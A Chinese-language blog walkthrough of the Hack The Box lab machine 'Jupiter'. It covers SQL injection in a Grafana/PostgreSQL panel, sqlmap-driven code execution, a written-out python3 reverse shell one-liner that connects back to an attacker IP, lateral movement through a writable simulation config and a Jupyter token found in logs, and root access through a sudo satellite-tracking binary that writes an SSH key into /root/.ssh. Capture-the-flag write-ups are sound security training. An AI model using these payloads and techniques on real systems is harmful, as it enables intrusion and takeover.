# Jupiter

Jupiter 是一台中等难度的 Linux 机器，它有一个使用 PostgreSQL 数据库的 Grafana 实例，该数据库在权限上过度扩展，容易受到 SQL 注入的影响，因此容易受到远程代码执行的影响。一旦站稳脚跟，就会注意到一个名为 Shadow 的实用程序，这是一种科学实验工具，可以简化对真实网络应用程序的评估，但其配置文件的权限配置错误。然后，通过查看与 Jupyter Notebook 关联的日志文件来实现横向移动，这些日志文件包含次要用户的令牌。获得对此用户的访问权限后，可以通过滥用卫星跟踪系统二进制文件来实现权限提升，该二进制文件可能由次要用户使用“sudo”权限执行。

---

## 外部信息搜集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/804ad903-4816-44e1-252b-bfa4e5d5a1a2.png)

### Web枚举

访问80跳转到了jupiter.htb，加入/etc/hosts

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d1c14bdb-d17b-d1fc-fb64-76e6fdaa6833.png)

#### vhost扫描

ffuf扫出一个vhost

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/aee5a9d5-4e7b-d7c8-0a20-b769ea25a366.png)

kiosk子域

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ecab9935-b31f-df45-43e2-72c822a1b3bc.png)

### SQL注入

我在查看bp日志的时候发现了这个包，里面包含了非常显眼的sql查询语句

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b22bb6f0-1542-0069-8204-e6c30abe1808.png)

把请求给到repeater，使用version()查询一下，发现执行成功

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ee0419f3-84b7-2bc9-a89c-0d148c1c5952.png)

接下啦就不再需要脑子了，我们可以通过sqlmap一键尝试RCE

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/376e28cb-aa9b-063c-1245-9887f9eaaa52.png)

正如所料，是DBA

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f0d7893c-72e9-af18-6c34-17af23f34ca0.png)

来个常规python3 reverse shell payload

	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &

payload最后的&不能少，否则shell可能会被杀死

getshell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/336a3732-a511-bf3e-cf3f-890989fe9d5f.png)

## 本地横向移动 -> juno

传个pspy

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/614ad9ac-6e90-454b-22a2-e3cede40470f.png)

```shell
2023/12/22 07:24:01 CMD: UID=1000  PID=2159   | 
2023/12/22 07:24:01 CMD: UID=1000  PID=2160   | rm -rf /dev/shm/shadow.data 
2023/12/22 07:24:01 CMD: UID=1000  PID=2161   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
2023/12/22 07:24:01 CMD: UID=1000  PID=2164   | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/12/22 07:24:01 CMD: UID=1000  PID=2165   | lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/12/22 07:24:01 CMD: UID=1000  PID=2170   | 
2023/12/22 07:24:02 CMD: UID=1000  PID=2171   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
2023/12/22 07:24:02 CMD: UID=1000  PID=2173   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
2023/12/22 07:24:02 CMD: UID=1000  PID=2175   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
```

我们可以看到/home/juno/.local/bin/shadow这个应用似乎正将yml文件名作为输入并运行

这个文件我们有权读写

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1a97a2a6-9671-99b0-0c21-263f54a64353.png)

当我查看该文件时，接下来要做的事情便不再需要解释了

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/453ba8c6-19c8-5c8b-1534-7a8fd272556a.png)

python3 payload

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/03eb1ad0-4ec0-4b32-8bfb-a7b8c0c7a05d.png)

发现它确实执行了，但似乎执行没成功，反正我没get到shell

换种方法，直接写入ssh key

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9f8463e7-f812-b4a2-905e-a4fec631d0dc.png)

这次也执行了

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4d90cbbf-2f37-d40e-6864-9cdf5cc9cb01.png)

登一下ssh看看有没有成功

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e43d371e-bf90-cced-632f-dcdec7b9c115.png)

## 本地横向移动 -> jovian

我看到当前用户具有另一个组，下意识查看那个组是否具有某些文件或目录

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8f7b1c02-4412-a5a0-f682-babc966bdb64.png)

当我查看其中一个日志文件后，我发现本地8888端口的http服务应该就是jupyter

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/38853b8b-d239-d308-25fa-e468e0462b6c.png)

ssh做个端口转发

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bedf6f92-a5b4-1a2a-3ca5-bcf1ae8ddb05.png)

通过日志文件里的正确token，我们能够登录进去

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d973e3c1-b29c-49f3-6b95-07031e98349a.png)

进入这个文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9b824e3d-871b-bfe9-32d9-a6c5ad515920.png)

在这里我们能够运行python代码

直接来个python shellcode

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b5dc4a41-a485-6290-1f94-b67c321c24bb.png)

nc

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ba3e3b59-d255-b954-daa7-c6d09f3d1a24.png)

## 本地权限提升

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8029bc89-0310-9c7c-6264-3c645f65a478.png)

通过strace发现它会读取/tmp/config.json，但由于不清楚它的配置究竟是怎么样的，所以即使我们自己创建了文件也没有意义

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/db3aa60c-aea9-5244-8a2a-8e86d8afa558.png)

find

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d8f4dea4-935c-61da-8ba9-4aef06006586.png)

在那个目录下有我们想要的config.json

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9eddde60-03d3-44e1-2ed6-a45d088eda98.png)

```json
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"http://celestrak.org/NORAD/elements/weather.txt",
		"http://celestrak.org/NORAD/elements/noaa.txt",
		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```

将config.json复制到/tmp

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c8a54b1f-dbfd-2d17-4163-e72d67af2a09.png)

运行看看效果

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2c2c29c0-dd8d-ba2a-6ba5-6de61a430ee6.png)

主要关注这句话

	tleroot does not exist, creating it: /tmp/tle/

我们可以将tleroot改到/root/.ssh，然后它就会去请求tlesources的文件复制到tleroot，我们可以指定ssh public key

编辑/tmp/config.json

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d2229b9f-b861-a420-6261-9d77158c6b7b.png)

再次执行

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/fc4d7493-40da-9631-36f3-7cca45a4bf3f.png)

ssh登root

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e5b2c546-de8b-df51-6bc6-a2ffc514d660.png)

root flag 还在老地方
